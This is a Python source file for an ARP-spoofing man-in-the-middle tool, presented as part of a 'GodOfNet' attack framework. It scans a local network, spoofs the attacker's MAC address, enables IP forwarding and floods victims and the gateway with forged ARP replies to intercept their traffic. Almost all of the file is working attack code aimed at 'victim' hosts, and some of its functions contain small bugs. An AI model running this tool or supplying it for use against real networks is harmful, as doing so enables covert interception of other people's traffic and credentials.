#!/usr/bin/env python3

import nmap as nm
import socket
import ipaddress
import struct
import concurrent
import argparse
import fcntl
import re
import os
import sys
import random
import time
from scapy.all import Ether, ARP, srp, send, get_if_hwaddr
from subprocess import call
from pwn import log
from colors import *


def enable_linux_iproute():
    file_path = '/proc/sys/net/ipv4/ip_forward'

    with open(file_path) as f:
        if f.read() == 1:
            return 0

    with open(file_path, 'w') as f:
        print(1, file=f)


def enable_ip_route(p, verbose=True):
    enable_linux_iproute()

    if verbose:
        p.success('Enabled.')


def read_conf(data):
    all_data = []

    for line_ in data:
        line_ = line_.rstrip('\n')

        all_data.append(list(re.split(r'\t+', line_.rstrip('\t'))))

    return all_data


def find_vendor(v, fdata):
    rdata = ''

    for i in fdata:
        if v == i[0]:
            rdata = i[1]

    return rdata


def call_change_mac(iface, mac):
    call(['ifconfig', iface, 'down'])
    call(['ifconfig', iface, 'hw', 'ether', mac])
    call(['ifconfig', iface, 'up'])


def change_mac(iface, p, mac=None):
    if mac is not None:
        call_change_mac(iface, mac)
        p.success('Restored.')

    else:
        fdata = read_conf(data=open('mac-vendor.txt', mode='r').readlines())

        first_6 = random.choice(fdata)

        vendor = find_vendor(first_6[0], fdata)

        if not vendor:
            vendor = 'Unknown Vendor'

        mac = ':'.join(re.findall(r'\w{2}', first_6[0])) + ':00:00:00'

        time.sleep(1)

        p.success(f'Generated {YELLOW}→  {GREEN}{mac}{WHITE} ({GREEN}{vendor}{WHITE}){RESET}')

        p = log.progress(f'Changing {WHITE}{iface}{RESET} mac address')

        time.sleep(1)

        call_change_mac(iface, mac)

        p.success('Changed.')


def get_hw_addr(ifname):
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)

    info = fcntl.ioctl(s.fileno(), 0x8927, struct.pack('256s', bytes(ifname, 'utf-8')[:15]))

    return ':'.join('%02x' % b for b in info[18:24])


def get_mac(ip):
    res, _ = srp(Ether(dst='ff:ff:ff:ff:ff:ff') / ARP(pdst=ip), timeout=3, verbose=0)

    if res:
        return res[0][1].src


def get_local_ip():
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    s.connect(('8.8.8.8', 80))
    x = s.getsockname()[0]
    s.close()

    return x


def t():
    return f'{YELLOW}{time.ctime()}{RESET}'


def spoof(target_ip, host_ip, verbose=True):
    target_mac = get_mac(target_ip)

    arp_response = ARP(pdst=target_ip, hwdst=target_mac, psrc=host_ip, op='is-at')

    send(arp_response, verbose=0)

    if verbose:
        self_mac = ARP().hwsrc
        log.success(
            f'Sent to {WHITE}"{GREEN}{target_ip}{WHITE}" {YELLOW}→  '
            f'{WHITE}"{GREEN}{host_ip}{WHITE}" '
            f'{YELLOW}is-at {WHITE}"{GREEN}{self_mac}{WHITE}"{RESET}'
        )


def restore(target_ip, host_ip, verbose=True):
    target_mac = get_mac(target_ip)
    host_mac = get_mac(host_ip)

    arp_response = ARP(pdst=target_ip, hwdst=target_mac, psrc=host_ip, hwsrc=host_mac)

    send(arp_response, verbose=0, count=7)

    if verbose:
        log.success(
            f'Sent to {WHITE}"{GREEN}{target_ip.rjust(8)}{WHITE}" {YELLOW}→  '
            f'{WHITE}"{GREEN}{host_ip}{WHITE}" '
            f'{YELLOW}is-at {WHITE}"{GREEN}{host_mac}{WHITE}"{RESET}'
        )


def scan_using_nmap(network, l=[], valid=[]):
    n = nm.PortScanner()

    sa = n.scan(hosts=network, arguments='-sn -T4')

    uphosts = sa['nmap']['scanstats']['uphosts']
    downhosts = sa['nmap']['scanstats']['downhosts']

    _ip, _mac, _vendor, _name = '', '', '', ''

    for key, value in sa['scan'].items():
        if str(value['status']['state']) == 'up':
            try:
                if get_local_ip() == value['addresses']['ipv4']:
                    _ip = value['addresses']['ipv4']
                    _mac = interface_mac
                    _vendor = _find_vendor(_mac)
                    _name = value['hostnames'][0]['name'] or False

                else:
                    _ip = value['addresses']['ipv4']
                    _mac = value['addresses']['mac']
                    _vendor = value['vendor'][_mac]
                    _name = value['hostnames'][0]['name'] or False

                l.append([_ip, _mac, _vendor, _name])
                valid.append(_ip)
            except Exception as err:
                raise err

    return uphosts, downhosts, l, valid


def nmap_connected_devices(network, p):
    uph, dowh, List, _targets = scan_using_nmap(network, List)

    p.success('Scanned')

    return uph, dowh, List, _targets


def _find_vendor(mac):
    fdata = read_conf(data=open('mac-vendor.txt', mode='r').readlines())
    nmac = str(mac[:8].replace(':', '')).upper()
    vendor = find_vendor(nmac, fdata)

    if not vendor:
        vendor = 'Unknown Vendor'

    return vendor


def _display_with_nmap(uph, dowh, List):
    log.success(f'{RESET}Total : {GREEN}{uph} up{WHITE}, {RED}{dowh} down{RESET}. ')

    blen = len([s for s in List if len(s) == len(max(List, key=len))][0])

    for _ip, _mac, _vendor, _name in List:
        if not _name:
            _name = 'Unknown Name'

        log.success(
            f'Found {RESET}({CYAN}{_name}{RESET}) {GREEN}{_ip}{WHITE} →  '
            f'{GREEN}{_mac}{WHITE} ({GREEN}{_vendor}{WHITE}){RESET}'
        )


def get_all_mac(target, List, ips_list):
    xmac = get_mac(target)

    if ':' in str(xmac):
        List.append([target, xmac])
        ips_list.append(target)


def x_get_connected_devices(targets, p):
    List, ips_list = [], []

    with concurrent.futures.ThreadPoolExecutor(
            max_workers=len(targets)
    ) as executor:
        {executor.submit(get_all_mac, str(target), List, ips_list): target for target in targets}

    p.success('Scanned')

    return List, ips_list


def display_found(l):
    for addr, mac in l:
        vendor = _find_vendor(mac)

        log.success(f'Found {GREEN}{addr}{WHITE} →  {GREEN}{mac}{WHITE} ({GREEN}{vendor}{WHITE}){RESET}')


def x_spoofed(target, gateway):
    spoof(target, gateway)
    spoof(gateway, target)


def x_restored(target, gateway):
    restore(target, gateway)
    restore(gateway, target)


def print_help():
    print(
        f'\n\t{WHITE}DNS Spoofing Script {YELLOW}»»{WHITE} part of{BLINK}{BOLD} '
        f'G o d O f N e t{RESET}{WHITE} Framework {YELLOW}»»{WHITE} by {BOLD}{CYAN}@{RED}Corruptor{RESET}\n'
    )
    print('\n\033[1m\033[4mOptions\033[0m:')
    print(f'{WHITE}\t-t\t\t--targets\t\tVictim IP Address {RED}OR{RESET}{WHITE} Specify the Whole Network.')
    print(f'{WHITE}\t-g\t\t--gateway\t\tThe host you wish to intercept packets for (Usually the Gateway).')
    print(f'{WHITE}\t-a\t\t--arp\t\t	Scan Network With ARP instead of nmap (default: nmap).')
    print(f'{WHITE}\t-i\t\t--interface\t  Specify an interface.\n')


def main():
    global interface_mac

    parser = argparse.ArgumentParser(description='ARP spoof script')
    parser.print_help = print_help
    parser.add_argument(
        '-t',
        '--targets',
        help='Victim IP Address to ARP poison',
        required=True
    )
    parser.add_argument(
        '-g',
        '--gateway',
        help='the host you wish to intercept packets for (usually the gateway)',
        required=True
    )
    parser.add_argument(
        '-i',
        '--interface',
        help='Specify an interface',
        required=True
    )
    parser.add_argument(
        '-a',
        '--arp',
        help='Scan With ARP instead of nmap scan',
        action='store_true',
        required=False
    )

    args = parser.parse_args()

    targets, gateway, iface, __arp = args.targets, args.gateway, args.interface, args.arp

    interface_mac = get_if_hwaddr(iface)

    log.info(f'Started at {t()}')

    if '/' in targets:
        if not __arp:
            p = log.progress(f'Scanning {CYAN}network{RESET} for {GREEN}connected{RESET} devices')

            up, down, List, targets = nmap_connected_devices(targets, p)

            _display_with_nmap(up, down, List)

        else:
            targets = ipaddress.IPv4Network(targets)
            targets = [str(target) for target in targets.hosts()]

            p = log.progress(f'Scanning {CYAN}network{RESET} for {GREEN}connected{RESET} devices')

            d_v, targets = x_get_connected_devices(targets, p)

            display_found(d_v)

    else:
        targets = targets.split(',')

    if gateway in targets:
        targets.remove(gateway)

    if get_local_ip() in targets:
        targets.remove(get_local_ip())

    if not targets:
        log.failure(f'No {GREEN}clients{RESET} detected in this {WHITE}network.{RESET}')
        log.warn(f'If you think this is an {YELLOW}error{RESET}, please specify your {GREEN}targets.{RESET}')
        log.failure('Exiting...')

        exit(0)

    p = log.progress('Enabling IP Routing...')

    time.sleep(0.5)

    enable_ip_route(p)

    try:
        p = log.progress('Generating mac address...')

        change_mac(iface, p)

        v_t = f'{RESET},{GREEN} '.join(targets)

        log.success(
            f'Starting {CYAN}attack{RESET} on {GREEN}{len(targets)}{RESET} '
            f'valid targets → "{GREEN}{v_t}{RESET}".'
        )

        while True:
            with concurrent.futures.ThreadPoolExecutor(
                    max_workers=len(targets)
            ) as executor:
                {
                    executor.submit(x_spoofed, str(target), gateway): target
                    for target in targets
                }
    except KeyboardInterrupt:
        log.warning(f'{RED}Detected{YELLOW} CTRL+C ! {RESET}restoring the network, please wait...\n')

        with concurrent.futures.ThreadPoolExecutor(
                max_workers=len(targets)
        ) as executor:
            {
                executor.submit(x_restored, str(target), gateway): target
                for target in targets
            }

        p = log.progress(f'Restoring {WHITE}{iface} {GREEN}→  {WHITE}{interface_mac}{RESET} mac address')

        change_mac(iface, p, mac=interface_mac)
    except OSError as err:
        change_mac(iface, p, mac=interface_mac)

        exit(log.failure(str(err)))


if os.getuid():
    exit(log.failure(f'{RED}Script must run with root privileges !{RESET}'))

try:
    main()
except KeyboardInterrupt:
    log.failure('Detected CTRL+C ! exiting...')
except Exception as errf:
    raise errf
